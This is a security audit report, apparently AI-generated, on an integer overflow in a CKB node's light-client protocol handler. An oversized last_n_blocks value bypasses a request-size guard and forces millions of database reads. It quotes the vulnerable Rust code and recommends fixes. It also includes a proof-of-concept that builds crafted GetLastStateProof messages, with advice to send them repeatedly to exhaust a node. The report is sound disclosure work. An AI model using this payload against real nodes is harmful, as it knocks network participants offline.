All cited code references check out against the actual source. Let me confirm each claim:

**Line 199** — `last_n_blocks: u64` decoded directly from peer message, attacker-controlled. [1](#0-0) 

**Lines 201–205** — Guard uses `(last_n_blocks as usize) * 2`, plain unchecked multiplication. On a 64-bit target `usize` is 64 bits; `(2^63_usize) * 2` wraps to `0` in Rust release mode (overflow-checks are off by default). With `difficulties.len() == 0`, `0 + 0 > 1000` is false → guard bypassed. [2](#0-1) 

**Lines 237–247** — `reorg_last_n_numbers` else-branch: `min(start_block_number, 2^63) == start_block_number`, so `min_block_number = 0` and the range is `(0..start_block_number)` — unbounded. [3](#0-2) 

**Lines 291–297** — `last_n_numbers` path: `last_block_number - start_block_number <= 2^63` is always true on a ~14M-block chain, so `last_n_numbers = (start_block_number..last_block_number)` — up to ~14M entries. [4](#0-3) 

**Lines 132–163** — `complete_headers` performs `get_ancestor` + `get_block` + `chain_root_mmr(*number - 1).get_root()` per entry with no size check. [5](#0-4) 

**Constant** — `GET_LAST_STATE_PROOF_LIMIT = 1000` confirmed. [6](#0-5) 

No additional guards exist between the bypassed check and `complete_headers`. The difficulty-validation block (lines 252–288) passes trivially with an empty `difficulties` list. The only prerequisite is a valid main-chain tip hash (public information) and a P2P connection to the light-client port.

---

Audit Report

## Title
Integer Overflow in Guard Allows Unbounded DB Iteration via `GetLastStateProofProcess::execute` — (`util/light-client-protocol-server/src/components/get_last_state_proof.rs`)

## Summary
The guard at lines 201–205 intended to cap server-side work at `GET_LAST_STATE_PROOF_LIMIT = 1000` uses unchecked multiplication `(last_n_blocks as usize) * 2`. On a 64-bit target in Rust release mode, supplying `last_n_blocks = 2^63` causes this expression to wrap to zero, bypassing the guard entirely. A remote, unprivileged peer can then force the server to iterate over the full chain history — performing multiple DB reads per block — in a single request handler invocation.

## Finding Description
`last_n_blocks` is decoded directly from the peer-supplied molecule message as a `u64` with no prior bound check:

```rust
// line 199
let last_n_blocks: u64 = self.message.last_n_blocks().into();
```

The guard immediately following uses plain Rust multiplication on `usize`:

```rust
// lines 201–205
if self.message.difficulties().len() + (last_n_blocks as usize) * 2
    > constant::GET_LAST_STATE_PROOF_LIMIT   // 1000
{
    return StatusCode::MalformedProtocolMessage.with_context("too many samples");
}
```

On a 64-bit target `usize` is 64 bits. Rust release builds do not enable `overflow-checks` by default, so arithmetic wraps. With `last_n_blocks = 2^63 = 9223372036854775808`:

```
(2^63_usize) * 2  ==  0   (two's-complement wrap)
```

With `difficulties` empty: `0 + 0 > 1000` → **false** → guard bypassed.

**Path 1 — reorg branch (lines 237–247):**  
Set `start_block_number = N > 0` and `start_hash` to any value that does not match the actual ancestor at height N (e.g., `Byte32::zero()`). The else-branch executes:

```rust
let min_block_number = start_block_number - min(start_block_number, last_n_blocks);
// min(N, 2^63) == N  →  min_block_number = 0
// reorg_last_n_numbers = (0..N)  →  N entries
```

On a 14M-block mainnet chain this yields ~14M entries fed directly into `complete_headers`.

**Path 2 — `last_n_numbers` branch (lines 291–297):**  
Set `start_block_number = 0` (reorg branch returns `Vec::new()` unconditionally). Then:

```rust
if last_block_number - start_block_number <= last_n_blocks
// 14_000_000 - 0 <= 2^63  →  true
```

`last_n_numbers = (0..last_block_number)` — ~14M entries, no reorg needed.

Both paths feed into `complete_headers` (lines 132–163), which calls `get_ancestor` + `get_block` + `chain_root_mmr(*number - 1).get_root()` per entry with no size check, resulting in ~28M sequential DB reads per request.

The difficulty-validation block (lines 252–288) passes trivially with an empty `difficulties` list. The only other prerequisite — a valid main-chain tip hash — is public information.

## Impact Explanation
On a mainnet node with ~14 million blocks, a single crafted `GetLastStateProof` message triggers ~14–28 million sequential DB reads inside one async handler. Repeated or concurrent requests from one or more peers cause sustained CPU and I/O exhaustion, degrading block validation, peer sync, and all other node functions to the point of effective unavailability. This matches **High (10001–15000 points): Vulnerabilities which could easily crash a CKB node**.

## Likelihood Explanation
The attack requires only a P2P connection to the light-client protocol port — no authentication, no PoW, no stake. The overflow value `2^63` is a fixed constant. The crafted message is a single valid molecule-encoded `GetLastStateProof` packet. Any peer that can connect to the node's light-client port can trigger this, and the attack is trivially repeatable and parallelisable across multiple connections.

## Recommendation
Add an explicit upper bound on `last_n_blocks` before any further use, and replace the unchecked multiplication with saturating arithmetic:

```rust
// Reject oversized last_n_blocks directly
if last_n_blocks as usize > constant::GET_LAST_STATE_PROOF_LIMIT {
    return StatusCode::MalformedProtocolMessage.with_context("last_n_blocks too large");
}

// Use saturating arithmetic in the existing guard
if self.message.difficulties().len()
    + (last_n_blocks as usize).saturating_mul(2)
    > constant::GET_LAST_STATE_PROOF_LIMIT
{
    return StatusCode::MalformedProtocolMessage.with_context("too many samples");
}
```

As defense-in-depth, add explicit size checks on `reorg_last_n_numbers` and `last_n_numbers` after they are computed and before `complete_headers` is called.

## Proof of Concept

```rust
// Path 1: reorg branch — ~14M entries
let msg = packed::GetLastStateProof::new_builder()
    .last_hash(valid_main_chain_tip_hash)        // any valid main-chain block hash (public)
    .start_hash(Byte32::zero())                  // wrong hash → triggers else branch
    .start_number(13_999_999u64.pack())          // large start_number on a 14M-block chain
    .last_n_blocks(9223372036854775808u64.pack()) // 2^63: (as usize)*2 == 0 in release
    .difficulty_boundary(some_valid_boundary)
    // difficulties: empty → difficulties.len() == 0
    .build();
// Guard: 0 + 0 > 1000 → false → passes
// reorg_last_n_numbers = (0..13_999_999) → ~14M entries → ~28M DB reads

// Path 2: last_n_numbers branch — ~14M entries, no reorg needed
let msg = packed::GetLastStateProof::new_builder()
    .last_hash(valid_main_chain_tip_hash)
    .start_hash(Byte32::zero())
    .start_number(0u64.pack())                   // start=0 → reorg_last_n_numbers=[]
    .last_n_blocks(9223372036854775808u64.pack()) // 2^63
    .difficulty_boundary(some_valid_boundary)
    .build();
// Guard: 0 + 0 > 1000 → false → passes
// last_block_number - 0 <= 2^63 → true → last_n_numbers = (0..14_000_000) → ~28M DB reads
```

Send this message repeatedly or from multiple peers to sustain exhaustion. The exploit can be confirmed with a unit test that constructs the message against a mock snapshot and asserts that `complete_headers` is called with an unbounded slice, or by running the node in release mode and observing I/O saturation on receipt of the crafted packet.

### Citations

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L132-163)
```rust
        for number in numbers {
            if let Some(ancestor_header) = self.snapshot.get_ancestor(last_hash, *number) {
                let position = leaf_index_to_pos(*number);
                positions.push(position);

                let ancestor_block = self
                    .snapshot
                    .get_block(&ancestor_header.hash())
                    .ok_or_else(|| {
                        format!(
                            "failed to find block for header#{} (hash: {:#x})",
                            number,
                            ancestor_header.hash()
                        )
                    })?;
                let uncles_hash = ancestor_block.calc_uncles_hash();
                let extension = ancestor_block.extension();

                let parent_chain_root = if *number == 0 {
                    Default::default()
                } else {
                    let mmr = self.snapshot.chain_root_mmr(*number - 1);
                    match mmr.get_root() {
                        Ok(root) => root,
                        Err(err) => {
                            let errmsg = format!(
                                "failed to generate a root for block#{number} since {err:?}"
                            );
                            return Err(errmsg);
                        }
                    }
                };
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L199-199)
```rust
        let last_n_blocks: u64 = self.message.last_n_blocks().into();
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L201-205)
```rust
        if self.message.difficulties().len() + (last_n_blocks as usize) * 2
            > constant::GET_LAST_STATE_PROOF_LIMIT
        {
            return StatusCode::MalformedProtocolMessage.with_context("too many samples");
        }
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L237-247)
```rust
        let reorg_last_n_numbers = if start_block_number == 0
            || snapshot
                .get_ancestor(&last_block_hash, start_block_number)
                .map(|header| header.hash() == start_block_hash)
                .unwrap_or(false)
        {
            Vec::new()
        } else {
            let min_block_number = start_block_number - min(start_block_number, last_n_blocks);
            (min_block_number..start_block_number).collect()
        };
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L291-297)
```rust
        let (sampled_numbers, last_n_numbers) = if last_block_number - start_block_number
            <= last_n_blocks
        {
            // There is not enough blocks, so we take all of them; so there is no sampled blocks.
            let sampled_numbers = Vec::new();
            let last_n_numbers = (start_block_number..last_block_number).collect::<Vec<_>>();
            (sampled_numbers, last_n_numbers)
```

**File:** util/light-client-protocol-server/src/constant.rs (L6-6)
```rust
pub const GET_LAST_STATE_PROOF_LIMIT: usize = 1000;
```
